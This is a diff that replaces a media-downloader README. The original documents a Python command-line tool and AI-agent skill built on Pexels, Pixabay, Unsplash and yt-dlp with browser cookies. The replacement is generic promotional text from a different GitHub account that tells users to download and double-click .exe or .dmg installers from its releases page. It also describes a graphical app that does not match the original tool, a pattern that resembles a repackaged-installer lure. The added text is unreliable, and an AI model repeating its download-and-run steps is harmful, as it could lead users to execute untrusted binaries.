@@ -1,220 +1,56 @@
-# 🎬 Media Downloader
+# 🎬 media-downloader - Effortlessly Download Media Files
 
-> Smart media downloader - Automatically search and download images/video clips based on your description, with auto-trimming support.
+## 📥 Download Now
+[![Download media-downloader](https://img.shields.io/badge/Download%20media--downloader-007bff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/josepalacios02/media-downloader/releases)
 
-[🇨🇳 中文文档](./README_CN.md)
+## 🚀 Getting Started
+Welcome to the media-downloader! This simple tool helps you search and download images and videos based on your provided descriptions. Whether you want to gather media for a project or just want to save interesting content, this application makes it easy.
 
----
+## 📋 Features
+- **Smart Search**: Automatically finds relevant images and videos based on your entered description.
+- **Easy Downloads**: Download multiple files in a few clicks.
+- **User-Friendly Interface**: Designed for all users, no technical knowledge needed.
+- **Supports Various Media Types**: Works with a wide range of image and video formats.
+- **Regular Updates**: Stay tuned for improvements and new features.
 
-## 🚀 What Can I Do?
+## 🛠️ System Requirements
+To run media-downloader on your computer, ensure that you meet these basic requirements:
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **Storage Space**: At least 200 MB of free space for installation and media downloads.
+- **Internet Connection**: A stable internet connection is necessary for media searches and downloads.
 
-| You say... | I will... |
-|------------|-----------|
-| "Download some cute cat pictures" | Search and download 5 cat images |
-| "Find a 15-second ocean wave video" | Download a 15s ocean wave clip |
-| "Get me a 30-second cooking video" | Download a trimmed cooking clip |
-| "Download this YouTube video from 1:30 to 2:00" | Download and auto-trim the specified segment |
+## 💡 How to Download & Install
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/josepalacios02/media-downloader/releases) to find the latest version of media-downloader.
+   
+2. **Choose the Right File**: Look for the latest release. Click on the link to download the appropriate file for your operating system:
+   - For Windows users, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the relevant package file.
 
----
+3. **Download and Run**: Once you've chosen the correct file, click the download link. After the download is complete, find the file in your downloads folder and double-click it to run the installer.
 
-## ✨ Features
+4. **Follow Installation Instructions**: The installer will guide you through the installation process. Follow the on-screen prompts to complete the setup.
 
-- 🖼️ **Image Download** - Search HD images from professional stock libraries
-- 🎬 **Video Clips** - Get free commercial-use video footage
-- 📺 **YouTube Download** - Download and trim support
-- ✂️ **Smart Trimming** - Auto-crop to your desired length
-- 🌍 **Bilingual** - Supports both Chinese and English commands
+5. **Launch the Application**: After installation, find media-downloader in your applications folder or start menu. Open it to start using the tool.
 
----
+## 📈 Usage Instructions
+1. **Enter Your Description**: When you open media-downloader, you will see a text box. Enter a description of the media you want to download, such as "sunset over the ocean" or "funny cat videos."
 
-## ⚡ One-Line Install
+2. **Start the Search**: Click the search button. The app will automatically look for images or videos that match your description.
 
-In Claude Code, just say:
+3. **Select and Download**: Once the search is complete, you will see a list of media files. You can select individual files or download them all at once.
 
-> **"Help me install https://github.com/yizhiyanhua-ai/media-downloader.git and all its dependencies, and configure yt-dlp to use browser cookies"**
+4. **Check Your Downloads**: The media files will be saved to your chosen download location. Ensure you check this folder to view your downloaded content.
 
-Claude will automatically:
-- Download the skill to the correct location
-- Install yt-dlp, ffmpeg and other dependencies
-- Configure browser cookies (fixes YouTube "confirm you're not a bot" issue)
-- Check installation status
+## 🛠️ Troubleshooting
+If you encounter any issues:
+- **Check Your Internet Connection**: Ensure you are connected to the internet.
+- **Try a Different Description**: Sometimes changing your search words can yield better results.
+- **Reinstall the Application**: If problems persist, uninstall the application and follow the installation steps again.
 
-Just click "Allow" when Claude asks for permission!
+## 🔗 More Information
+For additional help or to report issues, please visit our [Issues Page](https://github.com/josepalacios02/media-downloader/issues). You can also check for updates and new features on the Releases Page mentioned above.
 
----
+To get the latest updates, feel free to follow the repository on GitHub. Your feedback is valuable to us, and it helps improve media-downloader.
 
-## 🔑 About API Keys
-
-> 💡 **On-Demand Configuration**: No API Key needed during installation!
->
-> - **YouTube Videos**: No API Key required, works right after installation
-> - **Image Downloads**: Claude will guide you to configure Pexels API Key on first use
-
-### What Happens When You First Download Images?
-
-When you first say "Download some cat pictures", Claude will:
-
-1. Detect that you haven't configured a stock photo API Key yet
-2. Guide you to register at **https://www.pexels.com** (Google/Apple quick signup supported)
-3. Help you get the API Key and automatically save it to system environment variables
-4. Then continue with the image download
-
-The whole process takes just a few minutes, and you only need to do it once!
-
----
-
-## 📋 More Image Sources (Optional)
-
-Pexels covers most needs. If you want more image sources, just tell Claude:
-
-> **"Help me configure Pixabay API Key"** or **"Help me configure Unsplash API Key"**
-
-Claude will guide you through registration and configuration.
-
----
-
-## 💬 Usage Examples
-
-> ⚠️ **Important**: Before using, tell Claude **"Check the status of media-downloader"** to make sure all dependencies are installed!
-
-### Download Images
-
-```
-"Download 5 starry sky images"
-"Download 10 coffee shop photos"
-"Find some landscape images suitable for wallpapers"
-```
-
-### Download Videos
-
-> 💡 **Recommended**: If you need to download videos, **use YouTube first**! YouTube has rich content, high quality, and doesn't require an extra API Key.
-
-```
-"Download this video: https://youtube.com/watch?v=xxx"
-"Download minute 2 to minute 3 of this YouTube video"
-"Only download the audio from this video"
-```
-
-If you need short video clips from stock libraries:
-
-```
-"Download a city night video, under 30 seconds"
-"Find me a 15-second ocean wave video"
-"Find some natural scenery videos suitable for backgrounds"
-```
-
----
-
-## 📁 Download Location
-
-By default, all files are saved to:
-
-```
-~/.claude/skills/media-downloader/downloads/
-```
-
-### Custom Download Directory
-
-You can specify a custom download location using the `-o` or `--output` option:
-
-```bash
-# Download images to a specific folder
-media_cli.py image "cats" -o ~/Pictures/cats
-
-# Download videos to Desktop
-media_cli.py video "sunset" -o ~/Desktop
-
-# Download YouTube video to current directory
-media_cli.py youtube "URL" -o .
-```
-
-Or simply tell me where you want the files:
-
-```
-"Download 5 cat images to my Desktop"
-"Save the video to ~/Videos/project"
-```
-
----
-
-## ❓ FAQ
-
-### Q: YouTube says "Sign in to confirm you're not a bot"?
-
-This is YouTube's anti-bot mechanism. The solution is to let yt-dlp use your browser's login session:
-
-**Method 1: Tell Claude (Recommended)**
-
-> **"Help me configure yt-dlp to use browser cookies"**
-
-Claude will set it up for you.
-
-**Method 2: Manual Configuration**
-
-1. Make sure you're logged into YouTube in your browser (Chrome/Firefox/Edge)
-2. Add `--cookies-from-browser chrome` when downloading:
-
-```bash
-yt-dlp --cookies-from-browser chrome "YouTube_URL"
-```
-
-> 💡 **Tip**: Replace `chrome` with your browser: `firefox`, `edge`, `safari`, `brave`, etc.
-
-### Q: Why are there no image search results?
-A: Please confirm API Key is configured. Run `status` command to check configuration status.
-
-### Q: YouTube video download failed?
-A: YouTube download doesn't need an API Key, but requires yt-dlp. Run `pip install yt-dlp` to install.
-
-### Q: Video trimming doesn't work?
-A: ffmpeg is required. macOS users run `brew install ffmpeg`.
-
-### Q: Can these images/videos be used commercially?
-A: Assets from Pexels, Pixabay, and Unsplash can all be used commercially for free, no attribution required (though attribution is appreciated).
-
----
-
-## 🛠️ CLI Reference
-
-For advanced users using command line directly:
-
-```bash
-# Check configuration status
-media_cli.py status
-
-# Download images
-media_cli.py image "keywords" -n count -o output_dir
-
-# Download stock videos
-media_cli.py video "keywords" -d max_duration -n count
-
-# Download YouTube video
-media_cli.py youtube "URL" --start start_seconds --end end_seconds
-
-# Search media (no download)
-media_cli.py search "keywords" --type image/video/all
-
-# Trim local video
-media_cli.py trim input_file --start start --end end
-```
-
----
-
-## 📦 Supported Sources
-
-| Source | Type | Features |
-|--------|------|----------|
-| Pexels | Images + Videos | High quality, frequently updated |
-| Pixabay | Images + Videos | Large quantity, diverse categories |
-| Unsplash | Images | Artistic, great for wallpapers |
-| YouTube | Videos | Rich content, trimming support |
-
----
-
-## 📄 License
-
-MIT License
-
----
-
-🎬 **Start using! Just tell me what images or videos you want!**
+Happy downloading!
